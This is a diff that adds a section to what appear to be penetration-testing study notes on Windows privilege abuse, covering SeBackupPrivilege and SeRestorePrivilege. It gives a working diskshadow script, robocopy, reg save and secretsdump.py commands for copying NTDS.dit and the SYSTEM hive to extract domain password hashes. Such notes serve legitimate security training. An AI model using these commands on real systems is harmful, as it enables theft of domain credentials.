@@ -72,6 +72,50 @@ This privilege is *very similar to `SeImpersonatePrivilege`* and will use the sa
 You can use this token to *create a new process* (using `CreateProcessAsUser`) or create a *suspended process* and then set the token to it.
 ### `SeTcbPrivilege`
 Users who have this privilege enabled can use `KERB_S4U_LOGON` to get an [Impersonation Token](../../../../OSCP/windows-privesc/security-mechanisms/access-tokens.md#Impersonation%20Tokens) *without knowing the credentials*, add an *arbitrary group* (like Administrators) to the token, set the *[Integrity Level](../../../../OSCP/windows-privesc/security-mechanisms/MIC.md#Integrity%20Levels)* of the token, and assign the token *to the current thread*.
+### `SeBackupPrivilege` & `SeRestorePrivilege`
+These two privileges (usually found associated to users in the `Backup Operators` group) can be used to backup and restore any file on the system. One way to abuse this is to use it to create a *live copy* of the `C:/` drive, then extract hashes from the copy.
+#### Abusing
+First, a copy has to be made of the `C:` drive. On a Windows machine you can use the Windows tools `robocopy` and `diskshadow`. `diskshadow` is used to make a live copy of the drive (which has to be done b/c the drive is currently in use), and `robocopy` will copy files from one place to another. 
+##### Backup Script
+To create a backup of the `C:` drive, we need the following script:
+```
+set verbose on  
+set metadata C:\Windows\Temp\meta.cab  
+set context clientaccessible  
+set context persistent  
+begin backup  
+add volume C: alias cdrive  
+create  
+expose %cdrive% E:  
+end backup
+```
+- `set metadata`: This line creates the `meta.cab` file which stores info about the shadow copy like its creation data & time, its name, and size
+- `set context`: These two lines "set the contexts" of the backup so that it is both *persistent* and *client-accessible*. This makes sure the drive persists after a reboot of the machine and is accessible to us after the script runs.
+- `begin backup` this command initiates the backup
+- `add volume C: alias cdrive`: this line includes the `C:` drive in the backup and assigns it an alias name for reference
+- `create`: creates the backup
+- `expose %cdrive% E`: exposes the `C:` drive *as a network drive* with the drive letter `E:`
+##### Create a backup of `C:`
+Once we have the backup script, we can use it with `diskshadow` to create the shadow copy of `C:`
+```
+diskshadow /s backup_script.txt
+```
+##### Get the `NTDS.dit` file
+Now that we have a shadow copy of `C:` (saved and exposed as `E:` drive), we can use `robocopy` to copy the `NTDS.dit` file:
+```
+PS> cd E:
+PS> robocopy /b E:\Windows\ntds . ntds.dit
+```
+##### Decrypt `NTDS.dit`
+Now that we have the `NTDS.dit` file, we need to get the key used to decrypt the file *from the [registry](../../../../computers/windows/registry.md)*:
+```
+PS> reg save hklm\system c:\temp\system.bak
+```
+Now we need to copy both the key and the `NTDS.dit` file to our local machines so we can decrypt them. We'll decrypte with `secretsdump.py`:
+```
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
+
 
 > [!Resources]
 > - [HackTricks: Abusing Tokens for Privesc](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)
